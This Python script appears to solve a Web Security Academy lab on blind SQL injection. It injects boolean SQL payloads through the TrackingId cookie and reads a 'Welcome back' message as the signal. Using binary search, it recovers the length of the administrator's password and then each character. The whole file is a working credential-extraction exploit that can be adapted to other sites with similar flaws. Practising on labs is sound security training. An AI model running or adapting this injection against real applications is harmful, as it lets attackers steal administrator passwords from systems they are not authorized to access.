import requests

def test(track_id):
    url = 'https://*****.web-security-academy.net/' # lab url
    headers = {'cookie': f"TrackingId={track_id}; session=drHrOiC8IHQY8P3WkytOAsKjtS3BgL8d"}
    r = requests.get(url, headers=headers)
    if 'Welcome back' in r.text:
        print (f'testing {track_id} return True')
        return True
    else:
        print (f'testing {track_id} return False')
        return False

def gen_query_for_find_kth_char(pos, char):
    return f"1' or (select count(*) from users where username='administrator' and substr(password, {pos}, 1) <= '{char}') > 0--"

def gen_query_for_find_password_length(len):
    return f"1' or (select count(*) from users where username = 'administrator' and LENGTH(password) <= {len}) > 0--"

def get_len():
    l = 1
    r = 100
    pass_len = -1
    while l <= r:
        m = (l+r) // 2
        q = gen_query_for_find_password_length(m)
        if test(q):
            pass_len = m
            r = m - 1
        else:
            l = m + 1
    return pass_len

def get_password_kth_char(kth):
    l = 0
    r = 127
    found = -1
    while l <= r:
        m = (l+r) // 2
        q = gen_query_for_find_kth_char(kth, chr(m))
        if test(q):
            found = m
            r = m - 1
        else:
            l = m + 1
    return found

def get_password():
    print ('getting password length')
    pass_len = get_len()
    if pass_len == -1:
        print ('cant find password len')
        return
    print (f'found passowrd len = {pass_len}')
    password = ''
    for i in range(pass_len):
        print(f'getting passowrd {i+1} char')
        found = get_password_kth_char(i+1)
        if found == -1:
            print (f'char at {i+1} pos cant be found')
            return
        password += chr(found)
        print (f'current found password: {password}')
    print (password)

get_password()
